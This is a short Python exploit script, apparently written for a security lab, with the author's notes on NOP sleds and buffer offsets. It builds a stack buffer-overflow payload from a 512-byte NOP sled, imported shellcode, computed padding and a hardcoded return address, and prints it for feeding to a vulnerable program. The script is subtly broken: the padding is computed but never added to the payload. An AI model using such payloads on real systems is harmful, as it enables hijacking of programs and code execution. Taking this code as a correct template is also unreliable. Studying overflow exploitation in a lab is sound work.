# Questions
# -----------------------------------------------
# how can i find correct address to use from range of addresses (0-255)
# instead of using 255 nops, use size of buffer (511 bc both directions)
# fill entire buffer. definitely a noop instruction
# otherwise it will crash the program

#buffer a lot bigger than possible offset
#over jump instead of under jump
#fill rest of buffer with nops


from shellcode import shellcode
import sys

# Create a large NOP sled
nop_sled = b'\x90' * 512

# Add the shellcode after the NOP sled
payload = nop_sled + shellcode

# Calculate the expected buffer size (buf size in vulnerable() + offset for the saved instruction pointer)
buffer_size = 1024 + 4

# Calculate the padding size
padding_size = buffer_size - len(payload)

# Add the padding after the shellcode to fill the rest of the buffer
padding = b'A' * padding_size

# Calculate the approximate return address to jump into the NOP sled (assuming stack address in the middle of NOP sled)
approx_return_addr = 0xfff6cbfc - (len(nop_sled) // 2)

# Add the return address to the end of the payload
payload += approx_return_addr.to_bytes(4, 'little')

# Print the payload
sys.stdout.buffer.write(payload)